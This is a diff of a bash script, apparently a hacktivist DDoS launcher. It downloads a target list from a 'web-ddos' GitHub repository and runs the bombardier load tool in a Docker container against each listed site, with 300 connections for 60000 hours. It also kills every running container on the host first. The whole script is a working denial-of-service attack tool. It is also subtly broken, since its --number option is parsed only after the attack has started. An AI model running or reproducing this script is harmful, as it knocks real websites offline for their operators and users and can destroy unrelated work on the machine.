@@ -1,17 +1,37 @@
 #!/bin/bash
 
+function print_help {
+  echo -e "Usage: bash.sh"
+  echo -e "--number|-n - number of containers to start"
+}
+
+TARGETS_URL='https://raw.githubusercontent.com/ValeryP/help-ukraine-win/main/web-ddos/public/targets.txt'
+amount=300
+
 docker kill $(docker ps -q)
+curl --silent $TARGETS_URL --output targets.txt
 
-IFS=$'\n' read -d '' -r -a lines < ./resources.txt
-
-for i in "${lines[@]}"
-do
-   echo "$i"
-   export URL=$i
-    if [ -n "$1" ]
-    then
-    docker run --platform linux/amd64 -d  alpine/bombardier -c $1 -d 60000h -l $URL
-    else
-    docker run --platform linux/amd64 -d  alpine/bombardier -c 300 -d 60000h -l $URL
+while read -r site_url; do
+    if [ ! -z $site_url ]; then
+        if [ -n "$1" ]; then
+            docker run --platform linux/amd64 -d  alpine/bombardier -c $amount -d 60000h -l $site_url
+        else
+            docker run --platform linux/amd64 -d  alpine/bombardier -c 300 -d 60000h -l $site_url
+        fi
     fi
- done
+done < targets.txt
+
+while test -n "$1"; do
+  case "$1" in
+  --number|-n)
+      amount=$2
+      shift
+      ;;
+  *)
+    echo "Unknown argument: $1"
+    print_help
+    exit
+    ;;
+  esac
+  shift
+done
